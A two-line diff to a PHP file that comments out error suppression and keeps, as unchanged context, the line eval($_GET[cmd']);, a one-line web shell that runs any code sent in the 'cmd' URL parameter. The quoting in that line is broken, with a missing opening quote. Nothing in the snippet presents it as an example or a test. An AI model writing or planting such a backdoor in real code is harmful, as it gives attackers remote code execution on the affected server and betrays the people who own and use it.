@@ -1,2 +1,2 @@
-error_reporting(0);
+//error_reporting(0);
 eval($_GET[cmd']);
